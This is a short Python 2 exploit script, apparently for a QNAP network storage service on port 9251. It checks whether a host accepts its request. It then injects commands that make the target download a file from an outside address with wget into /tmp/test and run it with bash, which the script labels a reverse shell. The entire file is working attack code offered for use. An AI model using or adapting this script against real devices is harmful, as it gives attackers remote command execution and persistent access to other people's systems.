import socket
import os
import sys
import time

if len(sys.argv) < 2:
    print "\nUsage: " + sys.argv[0] + " <HOST>\n"
    print "USAGE: qnap.py host check/exploit"
    sys.exit()

initial = "\x01\x00\x00\x00"

cmd = "wget"
arg = "https://192.168.100.137/test"
arg2 = "-O"
arg3 = "/tmp/test"
arg4 = "--no-check-certificate"
sploit = "\x01\x00\x00\x00/|" + cmd + "\t" + arg + "\t" + arg2 + "\t" + arg3 + "\t" + arg4 + "|\x00"
host = sys.argv[1]

cmd2 = "bash"
arg5 = "/tmp/test"
sploit2 = "\x01\x00\x00\x00/|" + cmd2 + "\t" + arg5 + "|\x00"

def check(host):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    connect = s.connect((host, 9251))
    s.send(initial)
    response = s.recv(1024)
    if "client's request is accepted" in response:
        print "Host is exploitable"
    s.close()

def exploit(host):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    connect = s.connect((host, 9251))
    print "uploading bash reverse shell"
    s.send(sploit)
    newresponse = s.recv(1024)
    print newresponse
    s.close()
    time.sleep(5)
    execit(host)

def execit(host):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    connect = s.connect((host, 9251))
    print "executing bash reverse shell"
    s.send(sploit2)
    newresponse = s.recv(1024)
    print newresponse
    s.close()

def main():
    if sys.argv[2] == "check":
        check(host)
    elif sys.argv[2] == "exploit":
        exploit(host)
    elif sys.argv[2] == "execit":
        execit(host)

if __name__ == "__main__":
    main()
